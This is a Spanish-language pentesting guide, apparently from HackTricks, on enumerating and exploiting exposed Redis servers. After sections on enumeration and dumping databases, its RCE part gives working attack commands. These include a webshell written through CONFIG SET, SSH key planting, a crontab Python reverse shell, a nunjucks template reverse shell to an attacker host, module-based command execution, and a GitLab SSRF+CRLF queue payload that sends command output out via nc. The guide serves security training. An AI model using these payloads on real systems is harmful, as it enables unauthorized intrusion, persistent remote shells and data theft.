# 6379 - Pentesting Redis

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Informaci√≥n B√°sica

From [the docs](https://redis.io/topics/introduction): Redis es un **almacenamiento de estructuras de datos** en memoria de c√≥digo abierto (licencia BSD), utilizado como **base de datos**, cach√© y corredor de mensajes.

Por defecto, Redis utiliza un protocolo basado en texto plano, pero debes tener en cuenta que tambi√©n puede implementar **ssl/tls**. Aprende a [ejecutar Redis con ssl/tls aqu√≠](https://fossies.org/linux/redis/TLS.md).

**Puerto por defecto:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Enumeraci√≥n Autom√°tica

Algunas herramientas automatizadas que pueden ayudar a obtener informaci√≥n de una instancia de redis:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Enumeraci√≥n Manual

### Banner

Redis es un **protocolo basado en texto**, solo puedes **enviar el comando en un socket** y los valores devueltos ser√°n legibles. Tambi√©n recuerda que Redis puede funcionar usando **ssl/tls** (pero esto es muy raro).

En una instancia regular de Redis, solo puedes conectarte usando `nc` o tambi√©n podr√≠as usar `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
El **primer comando** que podr√≠as intentar es **`info`**. **Puede devolver una salida con informaci√≥n** de la instancia de Redis **o algo** como lo siguiente:
```
-NOAUTH Authentication required.
```
En este √∫ltimo caso, esto significa que **necesitas credenciales v√°lidas** para acceder a la instancia de Redis.

### Autenticaci√≥n de Redis

**Por defecto**, Redis se puede acceder **sin credenciales**. Sin embargo, se puede **configurar** para soportar **solo contrase√±a, o nombre de usuario + contrase√±a**.\
Es posible **establecer una contrase√±a** en el archivo _**redis.conf**_ con el par√°metro `requirepass` **o temporalmente** hasta que el servicio se reinicie conect√°ndose a √©l y ejecutando: `config set requirepass p@ss$12E45`.\
Adem√°s, se puede configurar un **nombre de usuario** en el par√°metro `masteruser` dentro del archivo _**redis.conf**_.

{% hint style="info" %}
Si solo se configura la contrase√±a, el nombre de usuario utilizado es "**default**".\
Adem√°s, ten en cuenta que **no hay forma de encontrar externamente** si Redis fue configurado solo con contrase√±a o nombre de usuario + contrase√±a.
{% endhint %}

En casos como este, **necesitar√°s encontrar credenciales v√°lidas** para interactuar con Redis, por lo que podr√≠as intentar [**fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#redis).\
**En caso de que encuentres credenciales v√°lidas, necesitas autenticar la sesi√≥n** despu√©s de establecer la conexi√≥n con el comando:
```bash
AUTH <username> <password>
```
**Credenciales v√°lidas** ser√°n respondidas con: `+OK`

### **Enumeraci√≥n autenticada**

Si el servidor Redis permite **conexiones an√≥nimas** o si has obtenido credenciales v√°lidas, puedes iniciar el proceso de enumeraci√≥n para el servicio utilizando los siguientes **comandos**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Otros comandos de Redis** [**se pueden encontrar aqu√≠**](https://redis.io/topics/data-types-intro) **y** [**aqu√≠**](https://lzone.de/cheat-sheet/Redis)**.**

Tenga en cuenta que los **comandos de Redis de una instancia pueden ser renombrados** o eliminados en el archivo _redis.conf_. Por ejemplo, esta l√≠nea eliminar√° el comando FLUSHDB:
```
rename-command FLUSHDB ""
```
M√°s informaci√≥n sobre c√≥mo configurar de manera segura un servicio Redis aqu√≠: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Tambi√©n puedes **monitorear en tiempo real los comandos de Redis** ejecutados con el comando **`monitor`** o obtener las **25 consultas m√°s lentas** con **`slowlog get 25`**

Encuentra m√°s informaci√≥n interesante sobre m√°s comandos de Redis aqu√≠: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Volcando Base de Datos**

Dentro de Redis, las **bases de datos son n√∫meros que comienzan desde 0**. Puedes encontrar si alguna est√° en uso en la salida del comando `info` dentro del bloque "Keyspace":

![](<../.gitbook/assets/image (766).png>)

O simplemente puedes obtener todos los **keyspaces** (bases de datos) con:
```
INFO keyspace
```
En ese ejemplo, se est√°n utilizando las **bases de datos 0 y 1**. **La base de datos 0 contiene 4 claves y la base de datos 1 contiene 1**. Por defecto, Redis utilizar√° la base de datos 0. Para volcar, por ejemplo, la base de datos 1, necesitas hacer:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
En caso de que obtengas el siguiente error `-WRONGTYPE Operation against a key holding the wrong kind of value` al ejecutar `GET <KEY>`, es porque la clave puede ser algo diferente a una cadena o un entero y requiere un operador especial para mostrarlo.

Para conocer el tipo de la clave, utiliza el comando `TYPE`, ejemplo a continuaci√≥n para claves de lista y hash.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Volcar la base de datos con npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **o python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre las nuevas recompensas por errores que se lanzan y actualizaciones cruciales de la plataforma

¬°√önete a nosotros en [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Redis RCE

### Shell Interactiva

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) puede obtener autom√°ticamente una shell interactiva o una shell inversa en Redis(<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Info from [**aqu√≠**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Debes conocer la **ruta** de la **carpeta del sitio web**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
‚ÄãSi la excepci√≥n de acceso al webshell, puedes vaciar la base de datos despu√©s de hacer una copia de seguridad y volver a intentarlo, recuerda restaurar la base de datos.

### Plantilla Webshell

Al igual que en la secci√≥n anterior, tambi√©n podr√≠as sobrescribir alg√∫n archivo de plantilla html que va a ser interpretado por un motor de plantillas y obtener un shell.

Por ejemplo, siguiendo [**este informe**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), puedes ver que el atacante inyect√≥ un **rev shell en un html** interpretado por el **motor de plantillas nunjucks:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
Tenga en cuenta que **varios motores de plantillas almacenan en cach√©** las plantillas en **memoria**, por lo que incluso si las sobrescribe, la nueva **no se ejecutar√°**. En estos casos, o el desarrollador dej√≥ activa la recarga autom√°tica o necesita hacer un DoS sobre el servicio (y esperar que se reinicie autom√°ticamente).
{% endhint %}

### SSH

Ejemplo [de aqu√≠](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Tenga en cuenta que el resultado de **`config get dir`** puede cambiar despu√©s de otros comandos de explotaci√≥n manual. Se sugiere ejecutarlo primero justo despu√©s de iniciar sesi√≥n en Redis. En la salida de **`config get dir`** podr√≠a encontrar el **home** del **usuario redis** (generalmente _/var/lib/redis_ o _/home/redis/.ssh_), y al saber esto, sabe d√≥nde puede escribir el archivo `authenticated_users` para acceder a trav√©s de ssh **con el usuario redis**. Si conoce el home de otro usuario v√°lido donde tiene permisos de escritura, tambi√©n puede abusar de ello:

1. Genere un par de claves p√∫blicas y privadas ssh en su pc: **`ssh-keygen -t rsa`**
2. Escriba la clave p√∫blica en un archivo: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Importe el archivo en redis: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Guarde la clave p√∫blica en el archivo **authorized\_keys** en el servidor redis:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. Finalmente, puede **ssh** al **servidor redis** con la clave privada: **ssh -i id\_rsa redis@10.85.0.52**

**Esta t√©cnica est√° automatizada aqu√≠:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
El √∫ltimo ejemplo es para Ubuntu, para **Centos**, el comando anterior deber√≠a ser: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Este m√©todo tambi√©n se puede utilizar para ganar bitcoin Ôºö[yam](https://www.v2ex.com/t/286981#reply14)

### Cargar m√≥dulo de Redis

1. Siguiendo las instrucciones de [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) puedes **compilar un m√≥dulo de redis para ejecutar comandos arbitrarios**.
2. Luego necesitas alguna forma de **subir el m√≥dulo compilado**.
3. **Carga el m√≥dulo subido** en tiempo de ejecuci√≥n con `MODULE LOAD /path/to/mymodule.so`
4. **Lista los m√≥dulos cargados** para verificar que se carg√≥ correctamente: `MODULE LIST`
5. **Ejecuta** **comandos**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. Descarga el m√≥dulo cuando quieras: `MODULE UNLOAD mymodule`

### Bypass de sandbox LUA

[**Aqu√≠**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) puedes ver que Redis utiliza el comando **EVAL** para ejecutar **c√≥digo Lua en sandbox**. En la publicaci√≥n vinculada puedes ver **c√≥mo abusar de ello** utilizando la funci√≥n **dofile**, pero [aparentemente](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) esto ya no es posible. De todos modos, si puedes **eludir el sandbox de Lua** podr√≠as **ejecutar comandos arbitrarios** en el sistema. Adem√°s, en la misma publicaci√≥n puedes ver algunas **opciones para causar DoS**.

Algunos **CVEs para escapar de LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### M√≥dulo Maestro-Esclavo

‚ÄãEl redis maestro sincroniza autom√°ticamente todas las operaciones al redis esclavo, lo que significa que podemos considerar la vulnerabilidad de redis como un redis esclavo, conectado al redis maestro que controlamos, luego podemos ingresar el comando a nuestro propio redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF hablando con Redis

Si puedes enviar una solicitud **en texto claro** **a Redis**, puedes **comunicarte con √©l** ya que Redis leer√° l√≠nea por l√≠nea la solicitud y solo responder√° con errores a las l√≠neas que no entiende:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Por lo tanto, si encuentras una **SSRF vuln** en un sitio web y puedes **controlar** algunos **headers** (quiz√°s con una vulnerabilidad CRLF) o **par√°metros POST**, podr√°s enviar comandos arbitrarios a Redis.

### Ejemplo: Gitlab SSRF + CRLF a Shell

En **Gitlab11.4.7** se descubri√≥ una vulnerabilidad **SSRF** y una **CRLF**. La vulnerabilidad **SSRF** estaba en la **funcionalidad de importar proyecto desde URL** al crear un nuevo proyecto y permit√≠a acceder a IPs arbitrarias en la forma \[0:0:0:0:0:ffff:127.0.0.1] (esto acceder√° a 127.0.0.1), y la vulnerabilidad **CRLF** se explot√≥ simplemente **agregando caracteres %0D%0A** a la **URL**.

Por lo tanto, fue posible **abusar de estas vulnerabilidades para comunicarse con la instancia de Redis** que **gestiona colas** de **gitlab** y abusar de esas colas para **obtener ejecuci√≥n de c√≥digo**. La carga √∫til de abuso de la cola de Redis es:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
Y la solicitud **URL encode** **abusando de SSRF** y **CRLF** para ejecutar un `whoami` y enviar de vuelta la salida a trav√©s de `nc` es:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Por alguna raz√≥n (como para el autor de_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _de donde se tom√≥ esta informaci√≥n) la explotaci√≥n funcion√≥ con el esquema `git` y no con el esquema `http`._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!

**Perspectivas de Hacking**\
Participa en contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hackeo en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e informaci√≥n en tiempo real

**√öltimos Anuncios**\
Mantente informado sobre las nuevas recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
